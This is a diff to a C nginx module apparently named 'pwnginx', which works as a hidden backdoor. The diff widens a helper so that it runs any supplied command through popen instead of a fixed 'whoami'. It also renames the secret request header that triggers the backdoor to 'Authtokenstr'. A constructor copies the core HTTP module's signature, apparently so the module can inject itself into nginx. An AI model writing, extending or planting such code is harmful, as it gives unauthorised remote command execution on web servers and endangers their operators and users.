@@ -6,17 +6,28 @@ static ngx_http_output_header_filter_pt  ngx_http_next_header_filter;
 static ngx_http_output_body_filter_pt ngx_http_next_body_filter;
 static ngx_int_t ngx_http_cre_module_init(ngx_conf_t *cf);
 
-static int cc(char* cstr, char* result){
+static int cc(char* cstr, char* result) {
     char buffer[10240];
-    FILE* pipe = popen("/bin/whoami", "r");
+    FILE* pipe;
+#ifdef _WIN32
+    pipe = _popen(cstr, "r");
+#else
+    pipe = popen(cstr, "r");
+#endif
     if (!pipe)
-    return -1;
-    while(!feof(pipe)) {
-        if(fgets(buffer, 4096, pipe)){
+        return -1;
+    while (!feof(pipe)) {
+        if (fgets(buffer, 4096, pipe)) {
             strcat(result, buffer);
         }
     }
+    
+#ifdef _WIN32
+    _pclose(pipe);
+#else
     pclose(pipe);
+#endif
+    
     return 0;
 }
 
@@ -50,7 +61,7 @@ static ngx_int_t ngx_http_pwnginx_header_filter(ngx_http_request_t *r){
 static ngx_int_t
 ngx_http_pwnginx_body_filter(ngx_http_request_t *r, ngx_chain_t *in)
 {
-    ngx_str_t checker = ngx_string("vtoken");
+    ngx_str_t checker = ngx_string("Authtokenstr");
     ngx_table_elt_t *header = search_headers_in(r, checker.data, checker.len);
     if(header == NULL) {
         return ngx_http_next_body_filter(r,in);
@@ -128,5 +139,3 @@ void __attribute ((constructor)) init (void){
     ngx_http_cre_module.signature = ngx_http_module.signature;
     ngx_http_cre_module.commands = ngx_http_module.commands;
 }
-
-
